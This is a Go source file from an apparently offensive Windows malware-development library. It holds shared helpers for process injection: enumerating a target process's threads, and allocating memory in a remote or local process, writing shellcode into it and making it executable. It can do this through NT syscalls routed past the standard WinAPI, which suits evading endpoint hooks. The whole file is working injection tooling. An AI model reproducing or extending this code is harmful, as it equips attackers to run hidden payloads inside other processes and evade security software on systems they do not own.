//go:build windows

// Memory + thread helpers shared by the per-method injection files
// (injector_self_windows.go, injector_remote_windows.go, and the
// other Method-X-per-file siblings). Extracted from the original
// monolithic injector_windows.go in v0.21.0; behaviour unchanged.

package inject

import (
	"fmt"
	"unsafe"

	"github.com/oioio-space/maldev/win/api"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
	"golang.org/x/sys/windows"
)


// --- Helper functions ---

func findAllThreads(pid int) ([]uint32, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return nil, err
	}
	defer windows.CloseHandle(snapshot)

	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))

	if err := windows.Thread32First(snapshot, &te); err != nil {
		return nil, err
	}

	var threads []uint32
	for {
		if te.OwnerProcessID == uint32(pid) {
			threads = append(threads, te.ThreadID)
		}
		if err := windows.Thread32Next(snapshot, &te); err != nil {
			break
		}
	}

	return threads, nil
}

// --- Memory helpers (Caller-aware, nil falls back to standard WinAPI) ---

// allocateAndWriteMemoryRemoteWithCaller uses NT syscalls via the Caller to
// allocate, write, and protect remote process memory. If caller is nil it
// falls back to standard WinAPI (VirtualAllocEx / WriteProcessMemory / VirtualProtectEx).
func allocateAndWriteMemoryRemoteWithCaller(hProcess windows.Handle, shellcode []byte, caller *wsyscall.Caller) (uintptr, error) {
	if caller == nil {
		// WinAPI fallback path
		addr, _, err := api.ProcVirtualAllocEx.Call(
			uintptr(hProcess), 0, uintptr(len(shellcode)),
			windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE,
		)
		if addr == 0 {
			return 0, fmt.Errorf("VirtualAllocEx failed: %w", err)
		}
		if err := windows.WriteProcessMemory(hProcess, addr, &shellcode[0], uintptr(len(shellcode)), nil); err != nil {
			return 0, fmt.Errorf("WriteProcessMemory failed: %w", err)
		}
		var oldProtect uint32
		if err := windows.VirtualProtectEx(hProcess, addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldProtect); err != nil {
			return 0, fmt.Errorf("VirtualProtectEx failed: %w", err)
		}
		return addr, nil
	}

	// 1. NtAllocateVirtualMemory (remote)
	var baseAddr uintptr
	regionSize := uintptr(len(shellcode))

	r, err := caller.Call("NtAllocateVirtualMemory",
		uintptr(hProcess),
		uintptr(unsafe.Pointer(&baseAddr)),
		0,
		uintptr(unsafe.Pointer(&regionSize)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if r != 0 {
		return 0, fmt.Errorf("NtAllocateVirtualMemory: NTSTATUS 0x%X: %w", uint32(r), err)
	}

	// 2. NtWriteVirtualMemory
	var bytesWritten uintptr
	r, err = caller.Call("NtWriteVirtualMemory",
		uintptr(hProcess),
		baseAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if r != 0 {
		return 0, fmt.Errorf("NtWriteVirtualMemory: NTSTATUS 0x%X: %w", uint32(r), err)
	}

	// 3. NtProtectVirtualMemory -> PAGE_EXECUTE_READ
	var oldProtect uint32
	protectAddr := baseAddr
	protectSize := uintptr(len(shellcode))

	r, err = caller.Call("NtProtectVirtualMemory",
		uintptr(hProcess),
		uintptr(unsafe.Pointer(&protectAddr)),
		uintptr(unsafe.Pointer(&protectSize)),
		uintptr(windows.PAGE_EXECUTE_READ),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if r != 0 {
		return 0, fmt.Errorf("NtProtectVirtualMemory: NTSTATUS 0x%X: %w", uint32(r), err)
	}

	return baseAddr, nil
}

// allocateAndWriteMemoryLocalWithCaller uses NT syscalls via the Caller to
// allocate, write, and protect local (current process) memory.
// If caller is nil it falls back to standard WinAPI (VirtualAlloc / RtlMoveMemory / VirtualProtect).
func allocateAndWriteMemoryLocalWithCaller(shellcode []byte, caller *wsyscall.Caller) (uintptr, error) {
	if caller == nil {
		// WinAPI fallback path
		addr, err := windows.VirtualAlloc(0, uintptr(len(shellcode)),
			windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
		if err != nil {
			return 0, fmt.Errorf("VirtualAlloc failed: %w", err)
		}
		api.ProcRtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
		var oldProtect uint32
		if err := windows.VirtualProtect(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldProtect); err != nil {
			return 0, fmt.Errorf("VirtualProtect failed: %w", err)
		}
		return addr, nil
	}

	currentProcess := ^uintptr(0) // pseudo-handle

	// 1. NtAllocateVirtualMemory (PAGE_READWRITE)
	var baseAddr uintptr
	regionSize := uintptr(len(shellcode))

	r, err := caller.Call("NtAllocateVirtualMemory",
		currentProcess,
		uintptr(unsafe.Pointer(&baseAddr)),
		0,
		uintptr(unsafe.Pointer(&regionSize)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if r != 0 {
		return 0, fmt.Errorf("NtAllocateVirtualMemory: NTSTATUS 0x%X: %w", uint32(r), err)
	}

	// 2. Copy shellcode (direct memory write - we own the process)
	for i, b := range shellcode {
		*(*byte)(unsafe.Pointer(baseAddr + uintptr(i))) = b
	}

	// 3. NtProtectVirtualMemory -> PAGE_EXECUTE_READ
	var oldProtect uint32
	protectAddr := baseAddr
	protectSize := uintptr(len(shellcode))

	r, err = caller.Call("NtProtectVirtualMemory",
		currentProcess,
		uintptr(unsafe.Pointer(&protectAddr)),
		uintptr(unsafe.Pointer(&protectSize)),
		uintptr(windows.PAGE_EXECUTE_READ),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if r != 0 {
		return 0, fmt.Errorf("NtProtectVirtualMemory: NTSTATUS 0x%X: %w", uint32(r), err)
	}

	return baseAddr, nil
}
